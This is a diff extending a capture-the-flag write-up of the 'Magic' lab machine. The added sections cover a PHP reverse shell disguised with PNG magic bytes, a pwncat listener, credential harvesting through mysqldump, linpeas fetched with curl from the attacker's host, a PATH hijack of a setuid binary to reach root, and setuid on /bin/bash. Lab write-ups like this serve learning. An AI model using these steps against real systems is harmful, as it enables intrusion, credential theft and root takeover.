@@ -1,3 +1,6 @@
+:PROPERTIES:
+:ID:       7ddd19fe-e04b-4fad-b835-7ffc7520692e
+:END:
 #+title: Magic
 
 * Initial enumeration
@@ -84,6 +87,8 @@ ip a s tun0
 The problem is that it only allows images and even if we change the file
 extension of the script it does not permit it.
 
+* Crafting a bypass
+
 What we can do is look for what is recognized as an image file. In other
 words, what is it that it is being used to verify that is an image.
 If we look for the headers of a PNG file, that are used by the OS to
@@ -117,3 +122,132 @@ with open("php-reverse-shell.php", "rb") as h:
 with open("reverse-shell.php.png", "wb") as h:
     h.write(magic + content)
 #+end_src
+
+* Access and internal enumeration
+
+In one way or another we now have the file that we want to upload to the server,
+the only thing that's left is to connect to it and use the reverse shell.
+
+#+begin_src shell
+pwncat -lp 1234 --config data/pwncatrc
+#+end_src
+
+Now we have to trigger it going to the
+10.10.10.185/images/uploads/reverse-shell.php.png and we should have our
+connection.
+
+If it doesn't recognize a shell you can invoke bash. And pwncat has the prompt
+--fancy command so you don't have to look at the horrible prompt anymore.
+
+Now we are some random user but at least we are in the machine.
+
+#+begin_src shell
+enum -s -a
+#+end_src
+
+We could also use linpeas or other tools to do this work for us.
+
+Furthermore we can stabilize our shell using python3 which is present in the
+machine the following way:
+
+#+begin_src bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+fg
+stty raw -echo
+#+end_src
+
+Knowing there are users and images stored here we can look at the database that
+is sure to be here.
+
+If we go to /var/www/Magic we can see all of the files that make the website. And
+there is a db file so we can take a look there.
+
+This is the most direct way to know some credentials since the username (theseus)
+and password (iamkingtheseus) are hardcoded there.
+
+But this seems to be just for interacting with the database since if we try to:
+#+begin_src bash
+su theseus
+#+end_src
+
+The password is not correct.
+
+We also cannot run mysql to try to look at the database. But we can use:
+#+begin_src bash
+mysqlshow -u theseus -p
+#+end_src
+
+And that gives us some information. I only found out typing mysql in the terminal
+and pressing TAB to see what was there.
+
+So let's try:
+#+begin_src bash
+mysqldump -u theseus -p
+#+end_src
+
+And we can see that there is a table called 'login' which has an INSERT statement
+with 'admin' and 'Th3s3usW4sK1ng' as username and password. Now we can try to
+interact with the user using these credentials.
+
+#+begin_src bash
+su theseus
+#+end_src
+
+Now we are theseus and, event though we are not root, that opens up some more
+possibilities.
+
+There is a user.txt file so we have the first flag and start looking for ways to
+escalate the privileges.
+
+Let's use linpeas for this. So copy the linpeas.sh file to a directory and from
+your machine:
+#+begin_src bash
+python3 -m http.server 8000
+#+end_src
+
+Then from the machine:
+#+begin_src bash
+curl "http://<yourIP>:8000/linpeas.sh"
+chmod +x linpeas.sh
+./linpeas.sh
+#+end_src
+
+Linpeas tells us that the /bin/sysinfo is owned by root but accessible to us
+which means it's a possible vector for privesc.
+
+With:
+#+begin_src bash
+ltrace /bin/sysinfo
+#+end_src
+
+It is clear that the setuid(0) and setgid(0) allows us to abuse what the binary
+is executing. And a couple of lines later we can see that it is calling
+popen("lshw -short", "r").
+
+That means that we can create a file called lshw and this binary will execute it
+with the privileges of the owner, root.
+
+So the file only needs this:
+#+begin_src bash
+#!/bin/bash
+bash -p
+#+end_src
+
+The p flag is for keeping the setuid info.
+
+Now:
+#+begin_src bash
+chomod +x lshw
+sysinfo
+#+end_src
+
+And now we are root!
+
+I had problems with viewing the output of the commands that I ran as root, not sure
+why, but we can simply a:
+#+begin_src bash
+chmod +s /bin/bash
+#+end_src
+
+To make bash available no matter the user and just run /bin/bash -p and cat the
+root.txt file to access the flag.
